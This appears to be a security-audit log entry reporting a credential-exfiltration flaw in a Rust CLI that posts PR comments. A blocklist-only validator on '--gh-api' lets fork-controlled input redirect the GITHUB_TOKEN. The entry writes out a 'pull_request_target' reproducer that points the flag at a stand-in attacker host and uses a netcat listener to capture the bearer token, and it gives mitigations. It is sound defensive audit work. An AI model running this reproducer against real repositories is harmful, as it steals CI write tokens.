session-appended 2026-05-21 expl-demo follow-up #10 (HEAD f7b4681, pr-comment surface). Three new findings targeting `nyctos pr-comment` — the CI/Actions-facing CLI that posts confirmed-finding markdown comments to GitHub PRs. This surface is materially under-sampled in the existing sentinel (none of #1-#46 cover it). The trust boundary is the GitHub Actions workflow YAML: in a `pull_request_target` flow the workflow runs with write-scoped `GITHUB_TOKEN` but interpolates fork-controlled inputs (head_ref, branch name, fork-PR title) into the command line / env, so attacker-influence on `--gh-api`, `--ui-url`, `--since-ref`, and on PR-comment authorship is realistic. Findings target three structurally distinct mistakes in `crates/nyctos/src/cmd/pr_comment.rs`.

---
record_exploration_finding
{
  "path": "crates/nyctos/src/cmd/pr_comment.rs",
  "line": 372,
  "cap": "CRED_EXFIL",
  "endpoint": "nyctos pr-comment --gh-api <URL> (GITHUB_TOKEN egress sink)",
  "rationale": "validate_gh_api_url is the sole gate between operator-supplied `--gh-api` and reqwest::Client::default_headers(Authorization: Bearer $GITHUB_TOKEN) at build_client (pr_comment.rs:438-452). The validator's doc comment (pr_comment.rs:357-371) names the exact threat — `pull_request_target` flows that interpolate forked-PR input into the workflow YAML — but the implementation only **blocklists** IMDS / cloud-metadata hosts (169.254.169.254, fd00:ec2::254, metadata.google.internal, metadata.azure.com, 169.254/16, fe80::/10) and refuses non-https + userinfo. There is no positive **allowlist** of `api.github.com` / `*.github.com` / the operator's GHE hostname; any other public HTTPS host is accepted. A `pull_request_target` workflow whose YAML reads e.g. `--gh-api ${{ github.event.pull_request.body }}` (or any fork-controlled string interpolated into the gh-api flag) ships the write-scoped GITHUB_TOKEN to the attacker's HTTPS server on the very first list-comments GET (pr_comment.rs:521). The blocklist does not catch a vanilla DNS name like `attacker.tld` or `gh-api.attacker.com` because none of those resolve to a link-local / metadata host. Compounds with finding below (no client timeout): the attacker's server can both capture the bearer AND stall the workflow until the outer 6h timeout, masking the CI step's failure surface. Static pass missed because the doc comment SAYS the threat is mitigated, so a doc-driven taint analyser believes the boundary holds; the mitigation is structurally a blocklist where an allowlist was intended. Distinct from sentinel #1 (CRED_EXPOSURE via ?token=), #4 (TraceLayer URI log), #5 (WS handshake token-in-URL): those leak the daemon's own bearer via logging surfaces; this finding leaks the runner's GITHUB_TOKEN via an authenticated egress channel governed entirely by validate_gh_api_url.",
  "suggested_payload_hint": "GitHub Actions reproducer in a `pull_request_target` workflow: `run: nyctos pr-comment --report report.json --repo ${{ github.repository }} --pr ${{ github.event.number }} --gh-api ${{ github.event.pull_request.body }} --token-env GITHUB_TOKEN`. Fork PR body = `https://collector.attacker.tld`. Confirm with a netcat listener that logs the `Authorization: Bearer ghs_…` header on /repos/<owner>/<repo>/issues/<pr>/comments. Mitigation: hard-pin scheme=https AND host ∈ {`api.github.com`, operator-configured `*.<ghe-host>`}; reject everything else. Belt-and-braces: scrub Authorization header on any 3xx redirect by setting `redirect(Policy::limited(0))` on the reqwest builder so a 302 to an out-of-allowlist host cannot carry the bearer."
}

